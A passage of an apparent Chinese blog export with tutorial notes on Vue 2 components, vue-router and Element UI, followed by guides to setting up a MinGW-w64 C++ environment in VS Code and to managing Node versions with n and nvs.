&lt;/div&gt;&lt;/template&gt;&lt;script&gt;// 组件交互相关的代码（数据、方法等） export default &#123; // 暴露 name:&#x27;School&#x27;, // 不写的话，别人在注册这个组件的时候可能会随便起名 data()&#123; return&#123; schoolName:&#x27;BUT&#x27;, address:&#x27;beijing&#x27; &#125; &#125;, methods:&#123; showName()&#123; alert(this.schoolName) &#125; &#125;, &#125;&lt;/script&gt;&lt;style&gt;/* 组件的样式 */ .demo&#123; background-color:orange; &#125;&lt;/style&gt; 一个必须有的.vue文件：App.vue。 1234567891011121314151617181920&lt;template&gt; &lt;div&gt; &lt;School/&gt; &lt;Student/&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; // 引入组件 import School from &#x27;./School&#x27; // 自行确定路径。这里的文件名可以省略拓展名.vue import Student from &#x27;./Student&#x27; export default &#123; name:&#x27;App&#x27;, components:&#123; School, Student &#125; &#125;&lt;/script&gt; 同时所有的组件都被vm管理，那么应该在什么地方创建vm呢？上面的几个文件都是.vue文件，.vue文件中一定不会出现new Vue语句。创建与App.vue同级的文件 main.js 【入口文件】，一切的事从它开始 ： 1234567import App from &#x27;./App.vue&#x27;new Vue(&#123; el:&#x27;#root&#x27;, // 服务于哪个容器 template:`&lt;App&gt;&lt;/App&gt;`, components:&#123;App&#125;, // 领头的组件是App &#125;) 上述代码中的#root容器则在 index.html 中存放，注意一定要先让模版出来再去引入main.js： 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;单文件组件的语法&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 注意下面语句的先后顺序！一定要先让模版出来再去引入main.js --&gt; &lt;!-- 准备一个容器 --&gt; &lt;div id=&quot;root&quot;&gt;&lt;/div&gt; &lt;script src=&quot;./js/vue.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 大致捋顺一下逻辑：要打开的是index.html，在index.html可以看到容器已经准备好（&lt;div id=&quot;root&quot;&gt;&lt;/div&gt;），vue已经就位（&lt;script src=&quot;./js/vue.js&quot;&gt;&lt;/script&gt;），这样就到了一切的开端：main.js，即入口文件(&lt;script src=&quot;./main.js&quot;&gt;&lt;/script&gt;)。 接下来进入main.js，main.js中首先进行的操作是引入App.vue(import App from &#39;./App.vue&#39;)：进入App.vue，里面有结构（&lt;template&gt;），又引入了school、student（这两个组件也注册、使用了，没有问题）。在组件import的时候的时候就开始读取school.vue文件，这文件里的东西就被读取。再回到App.vue，在引入school的下一行又引入了student，执行类似的操作。这两行执行完之后再对这两个组件进行注册，随后对整个模版进行解析。 结束后回到main.js，此时App已经import完毕，开始执行new Vue的操作。在new Vue的时候，由于之前在index.html中最先引入了vue.js，所以在main.js中自然可以new Vue；也引入了也注册了；组件标签也写了；服务于哪个容器也说了（#root）。 这时候回到index.html，在root容器里面就已经出现了想要的东西。但这时直接打开index.html会报错，因为浏览器不能直接支持ES6的模块化语法。这实际是因为main.js的第一句import就出了问题：.vue文件浏览器不能直接运行。import语句浏览器也不认识。 可以总结一下，随便打开一个普通组件的.vue，可以看到template里面写结构，script里面写脚本，这个脚本里面包含着给组件命名、配置数据、配置计算属性等等，style里面放的是样式。App组件则负责汇总所有组件。main.js创建vue实例并指明为哪个容器服务，index.html则是页面。 ref属性 被用来给元素或子组件注册引用信息（id的替代者） 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc） 使用方式： 打标识：&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt;或&lt;School ref=xxx&quot;&gt;&lt;/School&gt; 获取：this.$refs.xxx 配置项props功能：让组件接收外部传过来的数据 传递数据：&#96;&#96;&#96; 接收数据: 第一种方式（只接收）：props:[&#39;name&#39;] 第二种方式（限制类型）：props:&#123; name:String &#125; 第三种方式（限制类型、限制必要性、指定默认值）：props:&#123; name:&#123;type:String,required:true,default:&#39;张三&#39;&#125;&#125; 备注：props是只读的，Vue底层会监测对props的修改。如果进行了修改，就会发出警告；若业务需求确实需要修改，需要复制props的内容到data中一份然后去修改data中的数据。 全局事件总线（GlobalEventBus）是一种组件间通信的方式，适用于任意组件间通信。 安装全局事件总线1234567new Vue(&#123; ...... beforeCreate()&#123; Vue.prototype.$bus = this // 安装全局事件总线。$bus就是当前应用的vm。 &#125;, ...&#125;) 使用事件总线 1.接收数据：A组件想接收数据，就在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身。 1234567methods()&#123; demo(data)&#123;......&#125;&#125;......mounted()&#123; this.$bus.$on(&#x27;xxxx&#x27;,this.demo)&#125; ​ 2.提供数据：this.$bus.$emit(&#39;xxxx&#39;,数据) 最好在beforeDestroy钩子中，用$off去解绑当前组件使用到的事件。 使用Vue-cli官网：https://cli.vuejs.org/zh/ 准备工作：配置npm淘宝镜像，npm config set registry https://registry.npm.taobao.org 第一步（仅第一次执行）：全局安装@vue&#x2F;cli，npm install -g @vue/cli。可以执行以下命令更新vue-cli：12npm uninstall -g vue-clinpm install -g @vue/cli 第二步：切换到要创建项目的目录，然后使用命令创建项目：执行vue create vue_test，vue_test处写自己想要创建的项目名。会弹出以下选项：上图为选择想要的vue版本（注意不是vuecli版本)。babel进行语法转换，作用是将写Vue用到的ES6代码转换为ES5。eslint的作用是对JS进行语法检查。 第三步：启动项目： 回车之后脚手架继续执行，完成后通过cd vue_test进入文件夹。通过npm run serve # 回车后开始编译代码启动项目。 完成后可以看到脚手架不仅做了翻译，还开启了一个内置的小服务器，端口在8080：- Local: http://localhost:8080/ 。下一行- Network: http://172.16.17.33:8080/可以给同局域网内的同事使用，自己也可以使用。 按ctrl+c可以停止工程。 分析脚手架结构 .&#x2F; .gitignore：git忽略文件。其中是不被git管理的文件&#x2F;文件夹。 babel.config.js：babel配置文件。通常不需要进行配置，如实在需要可参考babel官网。 package.json：任何符合npm规范的工程都会有package.json，是包的说明书，里面写了包的名称、版本、常用命令、依赖、库等等。比如在命令中可以看到语句&quot;serve&quot;: &quot;vue-cli-service serve&quot;，这说明当我们运行命令npm run serve时实际执行的是vue-cli-service serve。serve命令在开发过程中使用，可以让它帮我们配置好服务器等等，也就是刚才的效果。build命令可以在所有功能都写完后把它变成一个浏览器认识的东西，也就是最后一次编译。lint命令很少用，其作用是把所有的JS和.vue文件都进行一次语法检查。少用是因为vscode本身就有很好的语法检查插件，而且开发的过程中通常都会关闭语法检查，只有在最后的时候才会打开一下看看有没有什么不合理的地方。 package-lock.json：包版本控制文件。可以在其中查看各个包的版本、下载地址等，这保证了以后可以用最快的速度安装指定版本。lock可以理解成是锁死了包的版本号，在下载的时候就不会错误的下载成其他版本。 .&#x2F;src&#x2F; main.js：【该文件是整个项目的入口文件】。执行完命令npm run serve后，就会直接运行main.js。其中的render: h =&gt; h(App)完成的是把App组件放入容器中。render是渲染的意思。注意它里面的import Vue from &#39;vue&#39;引入的其实是残缺版的vue，这个残缺的没有模版解析器，所以只要在new Vue里一写template就会报错，所以需要借助render。（标签&lt;template&gt;不受影响）可以command+’vue’打开文件来到node_modules&#x2F;vue&#x2F;types&#x2F;index.d.ts，再打开其上层文件夹node_modules&#x2F;vue的package.json，可以看到 &quot;module&quot;: &quot;dist/vue.runtime.esm.js&quot;，这个vue.runtime.esm.js才是真正引入的那个vue文件。最原始的vue应该是node_modules&#x2F;vue&#x2F;dist&#x2F;vue 。 App.vue：【App组件是所有组件的父组件】。其中import其他所有组件，注意路径。 .&#x2F;scr&#x2F;assets：存放静态资源。 .&#x2F;scr&#x2F;components：【存放所有程序员写出的组件】。除了App.vue。 .&#x2F;public index.html：【整个应用的界面】。语句&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;：针对IE的特殊配制，含义是让IE以最高的渲染级别渲染页面。语句&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt;：开启移动端的理想视口。路径&lt;%= BASE_URL %&gt;：即public文件夹的路径。标签&lt;noscript&gt;：如果浏览器支持JS，这个页面的东西就不会渲染。语句 &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;：容器。 .&#x2F;router 是自己新建的文件夹，存放路由。 .&#x2F;router&#x2F;index.js：【创建整个应用的路由器】 几个不能改的文件&#x2F;文件夹： .&#x2F;public文件夹，需要去这里面找index.html .&#x2F;public&#x2F;favicon.ico .&#x2F;public&#x2F;index.html .&#x2F;src文件夹，底层的默认配置需要 .&#x2F;main.js 可选配置文件：vue.config.js，放在与package.json同级的的地方。详情见：https://cli.vuejs.org/zh/config/ Vue脚手架隐藏了所有webpack相关的配置，若想查看具体的webpack配置，执行vue inspect &gt; output.js。 这个文件修改之后需要重新npm run serve使其生效。 大致流程：执行完npm run serve，来到src文件夹找到main.js，该文件引入了vue引入了App。到引入App的这一行，来到App.vue，发现里面引入了School Student，就把这两个对应的.vue文件也执行了，再汇总到App里。回到main.js继续走，render: h =&gt; h(App)把App组件放入容器中，也就是到index.html中放到了容器 &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;里。 关于不同版本的vue：1.vue.js是完整版的Vue，包含核心功能+模版解析器2.vue.runtime.xxx.js是运行版的Vue，只包含核心功能而不含模版解析器。3.由于vue.runtime.xxx.js没有模版解析器，所以不能用template配置项，而需要使用render函数接收到的createElement函数去指定具体内容。 关于main.js其中的render: h =&gt; h(App)：这里的render实际上是一个函数，实际调用它的是vue，调用时传递的是createElement参数。这个函数可以创建具体的元素、传递具体的内容。它相当于render(createElement)&#123; return createElement(&#39;h1&#39;,&#39;HelloWorld!&#39;)&#125;。这个函数里没用到this就可以写成箭头函数：render:(createElement)=&gt;&#123; return createElement(&#39;h1&#39;,&#39;HelloWorld!&#39;)&#125;，这个箭头函数左边只有一个参数就可以省略这个参数旁边的小括号：render:createElement=&gt;&#123; return createElement(&#39;h1&#39;,&#39;HelloWorld!&#39;)&#125;，这个箭头函数只有一句函数体而且还需要return，顺便把createElement换成个短一些的h：render:h=&gt;h(&#39;h1&#39;,&#39;HelloWorld!&#39;)。到此时，h里面还传入了两个参数:&#39;h1&#39;,&#39;HelloWorld!&#39;，有两个是因为h1是html的内置元素，需要知道这个元素里的具体内容，就需要第二个参数。但如果用的是组件，具体内容都在组件里面，注意里面的App两侧没有引号。 Vue中的ajaxVuex github地址：https://github.com/vuejs/vuex 专门在Vue实现 集中式 状态（数据）管理的一个Vue 插件 （通过Vue.use(Vuex)的方式使用)，对Vue应用中多个组件的共享状态进行集中式的管理（读&#x2F;写），也是一种组件间通信的方式，且适用于任意组件间通信。 什么时候使用Vuex：1.多个组件依赖于同一状态时。 2.来自不同组件的行为需要变更同一状态时。 Vue-router 2022.2.7以后，vue-router的默认版本为4版本，vue-router4只能在vue3中使用，vue-router3才能在vue2中使用。如果把vue-router4强行安装到vue2中则会报错。所以在vue2中安装vue-router3：npm i vue-router@3，在vue3中安装vue-router4则可以直接npm i vue-router。在哪个项目里用就在哪里开终端然后执行安装命令。在main.js中通过import VueRouter from &#39;vue-router&#39;引入这个插件，并在下面Vue.use(VueRouter)应用插件。 vue-router就是vue的一个插件库，专门用来实现SPA应用。 如何理解SPA应用？ 单页Web应用（single page web application，SPA） 整个应用只有一个完整的页面（index.html） 点击页面中的导航连接不会刷新页面，只会做页面的局部更新 数据需要通过ajax请求获取 如何理解路由？ 路由就是一组key-value的对应关系，多个路由需要经过路由器的管理。 key为路径，value可能是function或component。 路由分类： 前端路由：value是component，用于展示页面内容。 工作过程：当浏览器的路径改变时，对应的组件就会显示。 后端路由：value是function，用于处理客户端提交的请求。 工作过程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据。 基本使用 安装vue-router：npm i vue-router 应用插件：Vue.use(VueRouter) 编写router配置项 实现切换（active-class可以配置高亮样式）：&lt;router-link class=&quot;item&quot; active-class=&quot;active&quot; to=&quot;/about&quot;&gt;这里是About&lt;/router-link&gt; 指定展示位置：&lt;router-view&gt;&lt;/router-view&gt; 几个注意点 路由组件通常存放在pages文件夹，一般组件通常存放在components文件夹。(这两个文件夹同级，都在src里) 通过切换，“隐藏”了的路由组件默认是被销毁的，需要的时候再去挂载。 每个组件都有自己的$route属性，存储着这个组件自己的路由信息。里面有path、query等。 整个应用只有一个router，可以通过组件的$router属性获取到。 基本路由.&#x2F;router就是自己新建的文件夹，存放路由。.&#x2F;router&#x2F;index.js：【创建整个应用的路由器】.&#x2F;router&#x2F;index.js的一个示例： 12345678910111213import VueRouter from &#x27;vue-router&#x27; // VueRouter可以当成一个构造函数去用import About from &#x27;../pages/About&#x27;// const router = new VueRouter(&#123; // 创建一个路由器export default new VueRouter(&#123; // 创建并暴露一个路由器 routes:[ // 里面写一组一组的路由，每一个都是一个配置对象（因为是key-value） &#123; // 如果路径是/about，就去显示About组件。这里用到的组件得在上面import。 path:&#x27;/about&#x27;, // 也是浏览器地址栏后面追加的路径。 component:About &#125;, &#123; ... &#125;, ]&#125;) 在main.js通过import VueRouter from &#39;vue-router&#39;引入这个插件，通过import router from &#39;./router&#39;引入路由器，并在下面Vue.use(VueRouter)应用插件。应用完之后，在new Vue中就可以使用配置项：router。下面是main.js的示例。 12345678910111213import Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import VueRouter from &#x27;vue-router&#x27;import router from &#x27;./router&#x27;Vue.config.productionTip = falseVue.use(VueRouter)new Vue(&#123; el:&#x27;#app&#x27;, render:h =&gt; h(App), router:router&#125;) 此外，还需要在用到了路由切换的地方用标签&lt;router-link&gt;并在其中使用to=&quot;目标路由&quot;、active-class=&quot;选中样式&quot;等处理跳转部分的语句，比如&lt;router-link class=&quot;item&quot; active-class=&quot;active&quot; to=&quot;/about&quot;&gt;这里是About&lt;/router-link&gt;。同时通过标签&lt;router-view&gt;指定组件的呈现位置。 在实际网页上可以看到，使用&lt;a&gt;标签和&lt;router-link&gt;标签得到的结果完全相同，打开开发者工具就可以看到，实际上&lt;router-link&gt;也被转化成了&lt;a&gt;标签处理。 嵌套（多级）路由 配置路由规则。使用 children配置项。注意 子路由的path不要加斜杠：1234567891011121314151617181920routes:[ &#123; path:&#x27;/about&#x27;, component:About, &#125;, &#123; path:&#x27;/home&#x27;, component:Home, children:[ // 通过children配置子级路由 &#123; path:&#x27;news&#x27;, // 此处一定不要写&quot;/news&quot;！ component:News &#125;, &#123; path:&#x27;message&#x27;, // 此处一定不要写&quot;/message&quot;！ component:Message &#125; ] &#125;] 跳转（要写完整路径）：&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt; 路由传参路由的query参数通过路径后添加问号的方式携带参数，多组key-value之间用&amp;分隔。 传递参数注意router-link里的to前面要加冒号！否则就会把里面传的东西全当字符串处理。在使用to的字符串写法时，加了冒号就会把双引号内的东西当作JS去解析，但是还需要一个模板字符串标志&#96;&#96;&#96;&#96; 括起来。此外，模板字符串里面混入的JS变量需要用${xxx}&#96;&#96;&#96;括起来。12345678910111213&lt;!-- 跳转并携带query参数，to的字符串写法 --&gt;&lt;router-link :to=&quot;`/home/message/detail?id=$&#123;m.id&#125;&amp;title=$&#123;m.title&#125;`&quot;&gt;显示&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;&lt;router-link :to=&quot;&#123; path:&#x27;/home/message/detail&#x27;, query:&#123; id:m.id, title:m.title &#125; &#125;&quot;&gt;跳转&lt;/router-link&gt; 接收参数： 每个组件自己的$route属性存储着这个组件的路由信息。里面有path、query、params等。12$route.query.id $route.query.title // id和title就是传的参数 路由的params参数 配置路由，一定要使用占位符声明接收params参数。1234567children:[ &#123; name:&#x27;xiangqing&#x27; path:&#x27;detail/:id/:title&#x27;, // 使用占位符声明接收params参数 component:News &#125; ] 传递参数注意，在使用to的对象写法传递参数时一定不能用path配置项，必须用name配置项！而且在配置路由时也得配置name。12345678910111213&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;&lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;显示&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;&lt;router-link :to=&quot;&#123; name:&#x27;xiangqing&#x27; params:&#123; id:m.id, title:m.title &#125; &#125;&quot;&gt;跳转&lt;/router-link&gt; 接收参数：每个组件自己的$route属性存储着这个组件的路由信息。里面有path、query、params等。12$route.params.id $route.params.title // id和title就是传的参数 命名路由作用：简化路由跳转。如何使用： 给路由命名：给谁命名就在谁的配置项里加一个name:&#39;xxx&#39;。12345678routes:[ &#123; name:&#x27;guanyu&#x27;, path:&#x27;/about&#x27;, component:About &#125;, &#123; ... &#125;, ] 简化跳转：简化前，需要写完整的路径；简化后，直接通过名字跳转。注意to前面需要加冒号。而且其内部要写成对象形式。12&lt;router-link to=&quot;/About&quot;&gt;简化前的跳转到about&lt;/router-link&gt;&lt;router-link :to=&quot;&#123;name:&#x27;guanyu&#x27;&#125;&quot;&gt;简化后的跳转到about&lt;/router-link&gt; 路由的props配置项作用：让路由组件更方便的收到参数。在router&#x2F;index.js里，哪个路由接收东西就在谁里面写props配置项。写法如下： 第一种写法（很少）：props值为对象，该对象中所有的key-value的组合最终都会以props的形式，通过props传给Detail组件。 index.js中的配置：props:&#123;a:900,b:&#39;hello&#39;&#125;，Detail.vue中的接收，注意使用字符串：props:[&#39;a&#39;,&#39;b&#39;]，Detail.vue的template中的使用：a:&#123;&#123;a&#125;&#125;。 缺点：传递的都是写死的数据。 第二种写法：props值为布尔值，若布尔值为true，则把路由收到的所有 params参数 以props的形式通过props传给Detail组件。 index.js中的配置：props:true，Detail.vue中的接收，注意使用字符串：props:[&#39;id&#39;,&#39;title&#39;]，Detail.vue的template中的使用：id:&#123;&#123;id&#125;&#125;。 缺点：不能传递query类型的参数。 第三种写法：props值为函数，该函数返回的对象中每一组key-value都会以props的形式通过props传给Detail组件。写法如下例所示：123456789101112&#123; name:&#x27;xiangqing&#x27;, path:&#x27;datial/:id&#x27;, component:Detail, props(route)&#123; return &#123; id:route.query.id, title:route.query.title &#125; &#125;&#125; 上面的props配置项也可以使用解构赋值&#x2F;解构赋值的连续写法：1234567props(&#123;query&#125;)&#123; return &#123; id:query.id, title:query.title &#125;&#125;props(&#123;query:&#123;id,title&#125;&#125;)&#123; return &#123; id, title &#125;&#125; 编程式路由导航路由守卫作用：对路由进行权限控制分类：全局守卫、独享守卫、组件内守卫 全局守卫全局前置守卫：初始化时执行+每次路由切换前执行 12345678910111213router.beforeEach((to,from,next)=&gt;&#123; console.log(&#x27;beforeEach&#x27;,to,from) if(to.meta.isAuth)&#123; // 判断当前路由是否需要 进行 权限控制 if(localStorage.getItem(&#x27;school&#x27;) === &#x27;BUT&#x27;)&#123; // 权限控制的具体规则 next() // 放行 &#125;else&#123; alert(&#x27;暂无权限查看&#x27;) // next (&#123;name:&#x27;张三&#x27;&#125;) &#125; &#125;else&#123; next() // 放行 &#125;&#125;) 全局后置守卫：初始化时执行+每次路由切换后执行 12345678router.afterEach((to,from)=&gt;&#123; console.log(&#x27;afterEach&#x27;,to,from) if(to.meta.title)&#123; document.title = to.meta.title // 修改网页的title &#125;else&#123; document.title = &#x27;test&#x27; &#125;&#125;) 独享守卫12345678910111213beforeEnter((to,from,next)=&gt;&#123; console.log(&#x27;beforeEnter&#x27;,to,from) if(to.meta.isAuth)&#123; // 判断当前路由是否需要进行权限控制 if(localStorage.getItem(&#x27;school&#x27;) === &#x27;BUT&#x27;)&#123; // 权限控制的具体规则 next() // 放行 &#125;else&#123; alert(&#x27;暂无权限查看&#x27;) // next (&#123;name:&#x27;张三&#x27;&#125;) &#125; &#125;else&#123; next() // 放行 &#125;&#125;) 组件内守卫进入守卫：通过路由规则，进入该组件时被调用，beforeRouteEnter(to,from,next)&#123; &#125;离开守卫：通过路由规则，离开该组件时被调用，beforeRouteLeave(to,from,next)&#123; &#125; 实践 组件化编码流程 拆分静态组件：组件要按照功能点划分，命名不要与html元素冲突。 实现动态组件：考虑好数据的存放位置，数据是一个组件在用还是一堆组件在用： 一个组件在用：放在组件自身即可。 一堆组件在用：放在它们共同的父组件上（状态提升） 实现交互：从绑定事件开始。 props适用于： 父组件&#x3D;&#x3D;&gt;子组件 通信 子组件&#x3D;&#x3D;&gt;父组件 通信（不过要求父先给子一个函数） 使用v-model时切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！ props传过来的如果是对象类别的值，修改对象中的属性时vue不会报错，但不推荐这样做。 Element UI一个基于Vue框架的PC端UI组件库。官网：https://element.eleme.cn/#/zh-CN 。 需要注意的是，如果使用了下面两行代码： 12import &#x27;element-ui/lib/theme-chalk/index.css&#x27;; // ElementUI所有样式全部被引入了Vue.use(ElementUI); // ElementUI所有组件全部被注册了 实际上是引入了所有的样式和所有的组件，则会使”chuknk-vendor.js”文件的体积过大（可以在浏览器的Network中查看）。此外，import &#39;element-ui/lib/theme-chalk/index.css&#39;;中的index.css也是全部的样式。 借助babel-plugin-component按需引入组件 参考Element UI官网 https://element.eleme.cn/#/zh-CN/component/quickstart 中的“按需引入”。 修改对应的babel文件 在main.js按需引入，注意引入时的首字母参照官网上已经给出的格式即单词首字母大写，形如import &#123; Button,Row,DatePicker &#125; from &#39;element-ui&#39;；还需要在main.js全局注册组件，如Vue.component(Button.name, Button);，或写为Vue.use(Button)。Button.name其实就是&lt;el-button&gt;，可以把Button.name修改为自己想要的名字然后把对应的html标签名也对应的修改掉。 不需要在main.js引入样式，脚手架会自动帮我们处理。 注意，使用最新版本的vue-cli生成的工程文件夹中没有文件.babelrc，而是babel.config.js。修改时也应注意细节，比如”plugins”和“presets”同级。 一个修改后的babel.config.js文件示例，注意第四行需要把官网写的&quot;es2015&quot;替换为&quot;@babel/preset-env&quot;： 123456789101112131415module.exports = &#123; presets: [ &#x27;@vue/cli-plugin-babel/preset&#x27;, [&quot;@babel/preset-env&quot;, &#123; &quot;modules&quot;: false &#125;] ], plugins: [ [ &quot;component&quot;, &#123; &quot;libraryName&quot;: &quot;element-ui&quot;, &quot;styleLibraryName&quot;: &quot;theme-chalk&quot; &#125; ] ]&#125; 可能存在的问题 按需引入时错误xxx not found解决：这可能是因为脚手架已经更新但UI官网还没有更新。根据报错提示安装对应的包npm i xxx即可。 错误Cannot find module &#39;@babel-preset-env/babel-preset&#39;解决：换成[&#39;@babel/env&#39;, &#123; modules: false &#125;]。","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Vue","slug":"前端/Vue","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/Vue/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://avalooooooon.github.io/tags/Vue/"}]},{"title":"gcc配置C++环境（Mingw-w64）","slug":"gcc配置C-环境（Mingw-w64）","date":"2022-01-06T11:13:53.000Z","updated":"2022-01-06T11:13:53.000Z","comments":true,"path":"2022/01/06/gcc配置C-环境（Mingw-w64）/","link":"","permalink":"https://avalooooooon.github.io/2022/01/06/gcc%E9%85%8D%E7%BD%AEC-%E7%8E%AF%E5%A2%83%EF%BC%88Mingw-w64%EF%BC%89/","excerpt":"","text":"官方文档 VS Code下 cmake 配置C++环境（windows） 下载 Mingw-w64下载MinGW-w64 - for 32 and 64 bit Windows。往下翻一翻，选择最新版本的x86_64-posix-seh。 解压下载下来的压缩包即可。这里我的解压路径为C: \\mingw64。 配置环境变量进入控制面板-&gt;系统和安全-&gt;系统-&gt;高级系统设置-&gt;环境变量，在系统变量的PATH中添加C:\\mingw64\\bin，保存；接下来cmd中以管理员身份运行gcc -v，验证是否配置好环境变量。 在VS Code中配置这一部分最好参考官方文档：使用Mingw-w64。 创建工作区比如在C盘创建一个空文件夹VSCode-C，然后在该文件夹下面再新建空文件夹“workspace”作为工作区，用于存放各种代码。再在workspace文件夹下创建一个test项目和它的配置文件“.vscode”。 安装扩展 C &#x2F; C ++ IntelliSense配置按Ctrl + Shift + P打开命令面板，键入“ C &#x2F; C ++”，从建议列表中选择“ 编辑配置（UI）”（Edit Configurations（UI））。VS Code会将在此处进行的更改写入c_cpp_properties.json.vscode文件夹中的文件中。主要修改的是配置集、编译器路径和IntelliSense模式。 C &#x2F; C ++ IntelliSense配置 写入之后，可以看到 .vscode下添加了c_cpp_properties.json文件，然后按照官方给出的配置进行拷贝就可以了。 12345678910111213141516171819&#123; &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;Win32&quot;, &quot;includePath&quot;: [], &quot;defines&quot;: [ &quot;_DEBUG&quot;, &quot;UNICODE&quot;, &quot;_UNICODE&quot; ], &quot;windowsSdkVersion&quot;: &quot;10.0.17763.0&quot;, &quot;compilerPath&quot;: &quot;C:/mingw64/bin/g++.exe&quot;,//根据个人安装位置修改 &quot;cStandard&quot;: &quot;c17&quot;, &quot;cppStandard&quot;: &quot;c++17&quot;, &quot;intelliSenseMode&quot;: &quot;$&#123;default&#125;&quot; &#125; ], &quot;version&quot;: 4&#125; 创建tasks.json创建构建任务，即创建一个tasks.json文件来告诉VS Code如何构建（编译）程序。该任务将调用g ++编译器以基于源代码创建可执行文件。 任务：配置默认生成任务”（Configure Default Build Task)。在下拉列表中，选择```使用模板创建Tasks.json文件```，然后选择```Others```。VS Code创建一个最小tasks.json文件，并在编辑器中将其打开。1234567891011121314151617181920212223使用以下代码片段替换整个文件内容：```json&#123; &quot;version&quot;: &quot;2.0.0&quot;, &quot;tasks&quot;: [ &#123; &quot;label&quot;: &quot;build hello world&quot;,//这里可以随意命名 &quot;type&quot;: &quot;shell&quot;, &quot;command&quot;: &quot;g++&quot;, &quot;args&quot;: [ &quot;-g&quot;, &quot;-o&quot;, &quot;HelloWorld&quot;, &quot;HelloWorld.cpp&quot; ], &quot;group&quot;: &#123; &quot;kind&quot;: &quot;build&quot;, &quot;isDefault&quot;: true &#125; &#125; ]&#125; 配置调试设置配置VS Code以在按F5键时启动GCC调试器（gdb.exe）。首次调试.cpp代码时，会弹出选择环境的下拉菜单。选择GDB &#x2F; LLDB环境。选择“g++.exe-生成和调试活动文件”。vs code会自动打开launch.json文件。 123456789101112131415161718192021222324252627282930&#123; // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;g++.exe - 生成和调试活动文件&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;C:/VS-Code-C/workspace/HelloWorld/HelloWorld.exe&quot;,//按照个人工作区名字配置 &quot;args&quot;: [], &quot;stopAtEntry&quot;: true, //&quot;cwd&quot;: &quot;$&#123;workspaceFolder&#125;&quot;, &quot;cwd&quot;: &quot;C:/mingw64/bin&quot;, &quot;environment&quot;: [], &quot;externalConsole&quot;: true, &quot;MIMode&quot;: &quot;gdb&quot;, &quot;miDebuggerPath&quot;: &quot;C:\\\\mingw64\\\\bin\\\\gdb.exe&quot;,//按照个人路径配置 &quot;setupCommands&quot;: [ &#123; &quot;description&quot;: &quot;为gdb启用整齐打印&quot;, &quot;text&quot;: &quot;-enable-pretty-printing&quot;, &quot;ignoreFailures&quot;: true &#125; ], &quot;preLaunchTask&quot;: &quot;C/C++: g++.exe 生成活动文件&quot; &#125; ] &#125; VS Code现在已配置为使用Mingw-w64。该配置适用于当前工作空间。要重用配置，只需将三个JSON文件复制到新工作区中的.vscode子文件夹，然后根据需要更改源文件和可执行文件的名称。 运行HelloWorld.cpp运行结束后，打开工作区，可以看到新生成了一些文件： 如果你在workspace下再次创建一个Hello文件夹，并在它下面写c++文件，会导致程序无法运行，因为我们配置的工作区为workspace，而在其下面的文件夹里的文件无法生成.exe文件，导致程序 运行报错[errror]Id returned 1 exit status。因此我们最好在workspace下直接创建c++文件。","categories":[{"name":"C++","slug":"C","permalink":"https://avalooooooon.github.io/categories/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://avalooooooon.github.io/tags/C/"}]},{"title":"node版本管理（macOS和windows）","slug":"node版本管理（macOS）","date":"2021-12-26T07:53:53.000Z","updated":"2021-12-26T07:53:53.000Z","comments":true,"path":"2021/12/26/node版本管理（macOS）/","link":"","permalink":"https://avalooooooon.github.io/2021/12/26/node%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%EF%BC%88macOS%EF%BC%89/","excerpt":"","text":"安装的npm全局模块不会在各个版本的node.js之间共享。还有可能有些npm包不支持当前使用的node版本 不要使用单数的node版本！ macOS：使用 n 版本管理工具检查node及npm环境12node -vnpm -v 安装node版本管理模块n12sudo npm i -g n n -V 安装和切换node版本可能要求权限，在命令前加sudo即可。 1234567891011121314# 列出所有node版本n ls # 安装某个版本n xx.xx.x (版本号)# 切换node版本(通过上下键盘加回车选择)n# 删除某个版本n rm xx.xx.x# 使用某个版本来运行脚本n use xx.xx.x a.js Windows&#x2F;macOS：使用 nvs 版本管理工具安装nvs nvs的设置参考官方说明 在nvs&#x2F;releases 下载最新版本的 nvs.msi，双击安装。添加环境变量： 1NVS_HOME=%LOCALAPPDATA%\\nvs 下面是一些基本命令。 12345678# 初始化并使用 NVSnvs install # 从 profile 和 environment 中移除 NVSnvs uninstall # 展示 NVS 版本nvs --version 如果想要把lts设置为系统默认的node版本： 1nvs link lts 注意，nvs use 是改变当前shell窗口的node版本，不是全局环境（nvm的区别）；nvs link是改变全局环境的node版本。 配置镜像地址国内需要把对应的镜像地址修改为淘宝的镜像地址。 12nvs remote node 